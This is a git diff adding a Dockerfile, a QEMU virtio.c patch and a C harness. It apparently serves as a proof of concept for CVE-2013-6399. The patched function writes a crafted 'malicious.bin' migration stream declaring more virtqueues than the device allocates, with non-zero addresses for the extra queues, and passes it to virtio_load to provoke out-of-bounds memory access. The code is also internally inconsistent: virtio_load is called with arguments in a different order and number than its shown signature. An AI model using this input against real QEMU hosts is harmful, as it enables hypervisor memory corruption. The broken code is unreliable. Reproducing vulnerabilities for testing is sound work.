diff --git a/Dockerfile.vuln b/Dockerfile.vuln
new file mode 100644
index 00000000..6c58857c
--- /dev/null
+++ b/Dockerfile.vuln
@@ -0,0 +1,32 @@
+FROM ubuntu:18.04
+
+ENV DEBIAN_FRONTEND=noninteractive
+
+# Update package lists and install build dependencies for QEMU
+RUN apt-get -y update && \
+    apt-get install -y build-essential curl unzip wget \
+    libglib2.0-dev libfdt-dev libpixman-1-dev zlib1g-dev \
+    libnfs-dev libiscsi-dev python pkg-config xxd gdb patch && \
+    rm -rf /var/lib/apt/lists/*
+
+# Copy the project files into the container
+COPY . /project
+
+# Set the working directory inside the container
+WORKDIR /project
+
+# Apply the patch to add our test function
+RUN patch -p0 hw/virtio/virtio.c < hw/virtio/virtio.c.patch
+
+# Build QEMU with warnings not treated as errors
+RUN ./configure --target-list=x86_64-softmmu --disable-werror && \
+    make -j$(nproc)
+
+# Compile the test program and link it with QEMU
+RUN gcc -o test_vulnerability test_vulnerability.c \
+    -Ihw/virtio -Iinclude -Iqemu -I. \
+    hw/virtio/virtio.o hw/virtio/virtio-pci.o \
+    -L. -lqemu-system-x86_64 -lglib-2.0 -lpixman-1 -lz -lm -lrt -ldl -pthread
+
+# Run the test
+CMD ["/bin/bash", "-c", "LD_LIBRARY_PATH=/project ./test_vulnerability"]
diff --git a/hw/virtio/virtio.c b/hw/virtio/virtio.c
index 05f05e7c..2f6866a4 100644
--- a/hw/virtio/virtio.c
+++ b/hw/virtio/virtio.c
@@ -12,6 +12,7 @@
  */
 
 #include <inttypes.h>
+#include <stdio.h>
 
 #include "trace.h"
 #include "exec/address-spaces.h"
@@ -891,6 +892,7 @@ int virtio_set_features(VirtIODevice *vdev, uint32_t val)
 
 int virtio_load(VirtIODevice *vdev, QEMUFile *f)
 {
+    printf("[INSTRUMENTATION] virtio_load\n");
     int i, ret;
     uint32_t num;
     uint32_t features;
diff --git a/hw/virtio/virtio.c.patch b/hw/virtio/virtio.c.patch
new file mode 100644
index 00000000..b8b4f9df
--- /dev/null
+++ b/hw/virtio/virtio.c.patch
@@ -0,0 +1,118 @@
+--- virtio.c	2023-11-01 00:00:00.000000000 +0000
++++ virtio.c.new	2023-11-01 00:00:00.000000000 +0000
+@@ -1,3 +1,4 @@
++#include <stdio.h>
+ #include "hw/virtio/virtio.h"
+ #include "qemu/error-report.h"
+ #include "qemu/log.h"
+@@ -1000,3 +1001,100 @@
+     return 0;
+ }
+ 
++/* Test function to check for CVE-2013-6399 vulnerability */
++int test_virtio_vulnerability(void)
++{
++    VirtIODevice *vdev;
++    QEMUFile *f;
++    int i, ret;
++    uint32_t num;
++    uint32_t features;
++    uint8_t status, isr;
++    uint16_t queue_sel;
++    uint32_t config_len;
++    uint8_t *config_data = NULL;
++    FILE *file;
++    
++    /* Create a test file with malicious data */
++    file = fopen("malicious.bin", "wb");
++    if (!file) {
++        fprintf(stderr, "Failed to create test file\n");
++        return 1;
++    }
++    
++    /* Write status byte */
++    status = 0x01;  /* Some valid status */
++    fwrite(&status, 1, 1, file);
++    
++    /* Write ISR byte */
++    isr = 0x00;  /* No interrupts pending */
++    fwrite(&isr, 1, 1, file);
++    
++    /* Write queue_sel */
++    queue_sel = 0;  /* Select queue 0 */
++    fwrite(&queue_sel, 2, 1, file);
++    
++    /* Write features (must be valid for virtio_set_features to succeed) */
++    features = 0;  /* No features enabled */
++    fwrite(&features, 4, 1, file);
++    
++    /* Write config_len */
++    config_len = 0;  /* No config data */
++    fwrite(&config_len, 4, 1, file);
++    
++    /* Write num value that is <= VIRTIO_PCI_QUEUE_MAX but > actual allocated queues */
++    num = 20;  /* This should be > actual allocated queues but <= VIRTIO_PCI_QUEUE_MAX */
++    fwrite(&num, 4, 1, file);
++    
++    /* Write data for each queue */
++    for (i = 0; i < num; i++) {
++        uint32_t vring_num = 256;
++        uint64_t pa = (i >= 10) ? 0x1000 : 0;  /* Non-zero pa for out-of-bounds queues */
++        uint16_t last_avail_idx = 0;
++        
++        fwrite(&vring_num, 4, 1, file);
++        fwrite(&pa, 8, 1, file);
++        fwrite(&last_avail_idx, 2, 1, file);
++    }
++    
++    fclose(file);
++    
++    /* Create a VirtIODevice with a small number of queues */
++    vdev = g_malloc0(sizeof(VirtIODevice));
++    if (!vdev) {
++        fprintf(stderr, "Failed to allocate VirtIODevice\n");
++        return 1;
++    }
++    
++    /* Allocate memory for 10 queues (less than the 20 in our malicious file) */
++    vdev->vq = g_malloc0(10 * sizeof(VirtQueue));
++    if (!vdev->vq) {
++        fprintf(stderr, "Failed to allocate VirtQueue array\n");
++        g_free(vdev);
++        return 1;
++    }
++    
++    /* Open the malicious file for reading */
++    file = fopen("malicious.bin", "rb");
++    if (!file) {
++        fprintf(stderr, "Failed to open test file for reading\n");
++        g_free(vdev->vq);
++        g_free(vdev);
++        return 1;
++    }
++    
++    /* Create a QEMUFile from the FILE* */
++    f = qemu_fopen_file_or_fd(fileno(file), "rb");
++    if (!f) {
++        fprintf(stderr, "Failed to create QEMUFile\n");
++        fclose(file);
++        g_free(vdev->vq);
++        g_free(vdev);
++        return 1;
++    }
++    
++    /* Call the vulnerable function */
++    fprintf(stderr, "Calling virtio_load with malicious data...\n");
++    ret = virtio_load(f, vdev, 1);
++    
++    /* Clean up */
++    qemu_fclose(f);
++    fclose(file);
++    g_free(vdev->vq);
++    g_free(vdev);
++    
++    /* If we get here without crashing, the vulnerability is fixed */
++    fprintf(stderr, "virtio_load returned %d\n", ret);
++    fprintf(stderr, "No crash detected - vulnerability is fixed\n");
++    return 0;
++}
diff --git a/test_vulnerability.c b/test_vulnerability.c
new file mode 100644
index 00000000..13e44ecb
--- /dev/null
+++ b/test_vulnerability.c
@@ -0,0 +1,19 @@
+#include <stdio.h>
+#include <stdlib.h>
+
+/* This function is defined in hw/virtio/virtio.c */
+extern int test_virtio_vulnerability(void);
+
+int main(int argc, char *argv[]) {
+    printf("Testing for CVE-2013-6399 vulnerability...\n");
+    
+    int result = test_virtio_vulnerability();
+    
+    if (result == 0) {
+        printf("Test PASSED: No vulnerability detected\n");
+        return 0;
+    } else {
+        printf("Test FAILED: Vulnerability detected\n");
+        return 1;
+    }
+}
